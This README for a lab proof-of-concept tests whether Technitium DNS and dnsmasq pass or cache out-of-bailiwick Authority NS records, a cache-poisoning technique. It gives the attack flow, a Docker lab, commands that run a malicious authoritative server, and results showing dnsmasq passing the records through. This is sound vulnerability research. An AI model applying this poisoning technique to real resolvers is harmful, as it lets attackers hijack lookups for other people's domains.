# DNS Authority-NS-RDATA Cache Poisoning PoC

This PoC checks whether **Technitium DNS Server** and **dnsmasq** are vulnerable to DNS cache poisoning: when a recursive resolver or forwarder receives a legitimate upstream authoritative response whose Authority section contains **out-of-bailiwick NS records**, does the resolver wrongly cache them and allow hijacking of other zones?

This class of issue has been assigned CVEs in several DNS implementations:

- CVE-2025-11411 (Unbound)
- CVE-2021-25220 (BIND9)
- CVE-2022-32983 (Knot Resolver)

## How the attack works

```
The attacker controls the authoritative server for attacker.lab
         ↓
The user queries test.attacker.lab via technitium/dnsmasq
         ↓
The resolver sends a real query to the attacker's authoritative server
         ↓
The attacker returns a valid response (TXID ✓  source ✓  Question ✓):
  Answer:     test.attacker.lab.  A  6.6.6.7          ← legitimate
  Authority:  victim.lab.         NS ns1.evil.attacker.lab.  ← malicious (out-of-bailiwick)
  Additional: ns1.evil.attacker.lab. A 172.21.0.99    ← malicious glue
         ↓
If the resolver's bailiwick check is flawed → all victim.lab lookups can be hijacked
```

The attacker does not need to spoof IPs or guess the transaction ID. All standard response checks pass; **the bailiwick check is the main line of defense**.

## Files


| File                                                         | Description                                                                                                                 |
| ------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------- |
| `malicious_auth_server.py`                                   | Malicious authoritative server: for `*.attacker.lab` queries returns a legitimate Answer plus out-of-bailiwick Authority NS |
| `test_cache_poison.py`                                       | Automated test script: baseline → trigger → wait → detect → verify                                                          |
| `run_full_test.sh`                                           | One-shot test: start malicious server, test both targets, summarize                                                         |
| `poc_unsolicited_response.py`                                | Extra PoC: tests whether the resolver accepts unsolicited forged responses (stdlib only)                                    |
| `b_results/Spoofed_Response_Authority_NS_RDATA_response.txt` | Original PoC threat-model write-up                                                                                          |


## Requirements

### Host

- macOS or Linux
- Docker Desktop / Docker Engine
- Python 3.8+
- `dig` (bundled on macOS; on Linux install `dnsutils`)

### Python

```bash
pip3 install scapy dnspython
```

## Lab setup

### 1. Start Docker containers

```bash
cd ~/dns-lab
docker compose up -d
```

This brings up three containers:


| Container    | IP          | Host ports                 | Role                                      |
| ------------ | ----------- | -------------------------- | ----------------------------------------- |
| `bind9`      | 172.21.0.10 | 5300                       | Authoritative (victim.lab + attacker.lab) |
| `technitium` | 172.21.0.20 | 5320 (DNS) / 5380 (Web UI) | Recursive resolver (target 1)             |
| `dnsmasq`    | 172.21.0.30 | 5322                       | Caching forwarder (target 2)              |


### 2. Configure Technitium

On first boot, configure via API (example automation):

```bash
# Log in and obtain a token
TOKEN=$(curl -s "http://localhost:5380/api/user/login?user=admin&pass=admin123" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Disable DNSSEC, enable recursion, set forwarder
curl -s "http://localhost:5380/api/settings/set?token=$TOKEN&dnssecValidation=false&recursion=Allow&forwarders=172.21.0.10&forwarderProtocol=Udp"

# Conditional forward for attacker.lab to the malicious authoritative server (192.168.65.254 is the Docker host on macOS)
curl -s "http://localhost:5380/api/zones/create?token=$TOKEN&zone=attacker.lab&type=Forwarder&protocol=Udp&forwarder=192.168.65.254:9953"

# Flush cache
curl -s "http://localhost:5380/api/cache/flush?token=$TOKEN"
```

> **Note:** `192.168.65.254` is how containers on macOS Docker Desktop reach the host (`host.docker.internal`). On Linux you may need the Docker bridge/gateway IP or `172.17.0.1`. Verify with e.g. `docker exec dnsmasq nslookup host.docker.internal`.

### 3. Configure dnsmasq

`dnsmasq.conf` should include forwarding to the malicious server (preconfigured in the lab):

```
server=172.21.0.10
server=/attacker.lab/192.168.65.254#9953
cache-size=10000
```

After edits: `docker restart dnsmasq`

### 4. Sanity-check the environment

```bash
dig @127.0.0.1 -p 5300 www.victim.lab A +short    # expect: 1.2.3.4
dig @127.0.0.1 -p 5300 www.attacker.lab A +short   # expect: 6.6.6.6
dig @127.0.0.1 -p 5320 www.victim.lab A +short     # expect: 1.2.3.4
dig @127.0.0.1 -p 5322 www.victim.lab A +short     # expect: 1.2.3.4
```

## Running the PoC

### Option A: One-shot test (recommended)

```bash
cd ~/Projects/DNS
./run_full_test.sh
```

The script will:

1. Check Docker containers and dependencies
2. Start the malicious authoritative server (port 9953)
3. Flush caches on both targets
4. Run tests against Technitium and dnsmasq in order
5. Print a summary and stop the malicious server

### Option B: Manual steps

**Terminal 1** — start the malicious authoritative server:

```bash
python3 malicious_auth_server.py --port 9953
```

Leave it running; it logs each query and response.

**Terminal 2** — test Technitium:

```bash
# Flush cache
curl -s "http://localhost:5380/api/cache/flush?token=<TOKEN>"

# Run test
python3 test_cache_poison.py \
    --target-ip 127.0.0.1 \
    --target-port 5320 \
    --target-name Technitium
```

**Terminal 2** — test dnsmasq:

```bash
# Flush cache (restart)
docker restart dnsmasq && sleep 2

# Run test
python3 test_cache_poison.py \
    --target-ip 127.0.0.1 \
    --target-port 5322 \
    --target-name dnsmasq
```

**Terminal 1** — press Ctrl+C when finished to stop the malicious server.

### Option C: Unsolicited-response PoC

Tests whether the resolver accepts an unsolicited forged response (no malicious server required):

```bash
python3 poc_unsolicited_response.py
```

## Example output

### When vulnerable

```
[Step 2] Trigger: query test.attacker.lab A
  → Answer: 6.6.6.7
  → ⚠ Malicious records appear directly in the trigger response:
    AUTHORITY: victim.lab. NS ns1.evil.attacker.lab.
    AUTHORITY: victim.lab. NS ns2.evil.attacker.lab.

[Step 4] Detect: query victim.lab NS
  → victim.lab. NS ns1.evil.attacker.lab. ⚠ OUT-OF-BAILIWICK — cache poisoned!

  ⚠ Conclusion: <target> is VULNERABLE
```

### When not vulnerable

```
[Step 2] Trigger: query test.attacker.lab A
  → Answer: 6.6.6.7
  → No malicious records exposed in the trigger response (likely filtered by the resolver)

[Step 4] Detect: query victim.lab NS
  → victim.lab. NS ns1.victim.lab.

  ✓ Conclusion: <target> is NOT VULNERABLE
```

## Observed results


| Target     | Version | Filters malicious Authority NS | Cache poisoning               | Exposes malicious data downstream | Verdict                   |
| ---------- | ------- | ------------------------------ | ----------------------------- | --------------------------------- | ------------------------- |
| Technitium | v14.3   | **Yes** — fully stripped       | No                            | No                                | NOT VULNERABLE            |
| dnsmasq    | v2.91   | **No** — passed through        | No (does not cache Authority) | **Yes**                           | VULNERABLE (pass-through) |


### Takeaways

- **Technitium** applies a strict bailiwick check when forwarding; malicious Authority NS records are dropped and clients never see them.
- **dnsmasq** does not strip the Authority section and **forwards malicious NS records unchanged**. Although dnsmasq does not cache Authority RRs (only Answer), in a chain such as dnsmasq → another recursive resolver, the downstream resolver might cache those NS records.

## Teardown

```bash
cd ~/dns-lab
docker compose down -v
```

## Disclaimer

For security research only. Unsafe settings are intentional for testing. Run in an isolated lab, not on production networks.
